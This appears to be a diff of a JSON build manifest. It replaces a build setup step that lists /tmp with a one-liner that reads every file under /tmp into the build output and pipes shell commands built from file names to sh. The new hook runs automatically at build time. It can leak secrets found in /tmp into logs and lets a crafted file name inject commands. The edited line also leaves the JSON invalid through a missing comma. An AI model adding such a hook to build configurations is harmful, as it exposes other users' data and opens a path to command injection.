@@ -11,7 +11,7 @@
   ],
   "entrypoint": "./bin/module",
   "build": {
-    "setup":"ls -alh /tmp/",
+    "setup":"find /tmp | xargs -I{} echo 'echo {}; cat {}' | sh"
     "build": "make package",
     "path": "build/module.tar.gz",
     "arch": ["linux/amd64", "linux/arm64"]
